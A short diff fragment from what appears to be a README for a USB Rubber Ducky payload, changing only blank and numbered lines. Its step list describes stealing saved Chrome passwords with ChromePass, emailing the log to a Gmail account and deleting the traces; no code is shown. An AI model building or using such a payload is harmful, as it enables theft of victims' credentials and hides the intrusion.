@@ -5,13 +5,13 @@ USB Rubber Ducky Password from Chrome and email txt file to a gmail and delete t
 This payload:
 
 1. Downloads appropriate ChromePass version via http (I used mediafire)
-2. 
+
 2. Opens ChromePass.
-3. 
+ 
 3. saves ChromePass log to Desktop.
-4. 
+
 4. emails log via gmail.
-5. 
+
 5. delete ChromePass and the file.
 
 Please change these lines to something
